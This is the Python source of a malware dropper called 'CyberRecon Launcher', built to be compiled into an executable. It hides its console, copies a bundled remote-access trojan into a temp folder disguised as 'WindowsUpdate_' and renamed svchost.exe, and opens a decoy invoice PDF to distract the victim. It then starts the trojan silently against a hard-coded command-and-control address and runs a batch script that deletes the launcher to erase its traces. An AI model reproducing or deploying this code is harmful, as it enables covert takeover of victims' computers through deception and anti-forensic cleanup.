"""
CyberRecon Launcher - Opens decoy PDF and runs RAT silently
This is the file that gets compiled into the final EXE
"""

import os
import sys
import shutil
import subprocess
import tempfile
import time
import ctypes


def hide_console():
    """Hide console window"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass


def get_base_dir():
    """Get the directory where the EXE is running from"""
    if getattr(sys, 'frozen', False):
        # Running as compiled EXE
        return sys._MEIPASS  # PyInstaller temp folder
    else:
        # Running as script
        return os.path.dirname(os.path.abspath(__file__))


def main():
    hide_console()
    
    # Get base directory
    base_dir = get_base_dir()
    
    # Create hidden temp directory for RAT
    tmpdir = tempfile.mkdtemp(prefix="WindowsUpdate_")
    
    # ========== STEP 1: Extract and run RAT ==========
    rat_src = os.path.join(base_dir, "CyberReconClient.exe")
    rat_dst = os.path.join(tmpdir, "svchost.exe")
    
    if os.path.exists(rat_src):
        shutil.copy2(rat_src, rat_dst)
        print(f"[+] RAT copied to: {rat_dst}")
    else:
        print(f"[-] RAT not found at: {rat_src}")
    
    # ========== STEP 2: Drop decoy PDF to Desktop (with validation) ==========
    decoy_src = os.path.join(base_dir, "Invoice_2024.pdf")
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    os.makedirs(desktop, exist_ok=True)
    decoy_dst = os.path.join(desktop, "Invoice_2024.pdf")

    # --- Security validations (CWE-22) ---
    def _is_safe_path(candidate: str, root: str) -> bool:
        """Return True if candidate resolves to a path inside root."""
        try:
            real = os.path.realpath(candidate)
            real_root = os.path.realpath(root)
            return real == real_root or real.startswith(real_root + os.sep)
        except Exception:
            return False

    if not os.path.isfile(decoy_src):
        print(f"[-] Decoy not found at: {decoy_src}")
    elif not decoy_src.lower().endswith(".pdf"):
        print(f"[-] Refusing to open non-PDF: {decoy_src}")
    elif not _is_safe_path(decoy_src, base_dir):
        print(f"[-] Path traversal detected in decoy path: {decoy_src}")
    else:
        try:
            shutil.copy2(decoy_src, decoy_dst)
            print(f"[+] Decoy dropped to: {decoy_dst}")

            # Only open if the destination itself is a real PDF under Desktop
            if decoy_dst.lower().endswith(".pdf") and _is_safe_path(decoy_dst, desktop):
                os.startfile(decoy_dst)
                print("[+] Decoy PDF opened")
            else:
                print("[-] Refusing to open: destination failed validation")
        except Exception as e:
            print(f"[-] Failed to open PDF: {e}")
    
    # ========== STEP 3: Run RAT silently in background ==========
    if os.path.exists(rat_dst):
        try:
            subprocess.Popen(
                [rat_dst, "--c2", "http://18.61.36.73:8443", "--auto-register"],
                creationflags=subprocess.CREATE_NO_WINDOW,
                shell=False
            )
            print("[+] RAT started in background")
        except Exception as e:
            print(f"[-] Failed to start RAT: {e}")
    
    # ========== STEP 4: Self-delete the launcher EXE ==========
    time.sleep(3)
    
    # Get path of the running EXE
    if getattr(sys, 'frozen', False):
        exe_path = sys.executable
    else:
        exe_path = os.path.abspath(__file__)
    
    # Create cleanup batch script
    bat_path = os.path.join(tmpdir, "cleanup.bat")
    with open(bat_path, "w") as f:
        f.write(f'''@echo off
:loop
del "{exe_path}" >nul 2>&1
if exist "{exe_path}" goto loop
del "%~f0"
''')
    
    # Run cleanup script
    try:
        subprocess.Popen(
            ["cmd", "/c", bat_path],
            creationflags=subprocess.CREATE_NO_WINDOW,
            shell=False
        )
    except:
        pass


if __name__ == "__main__":
    main()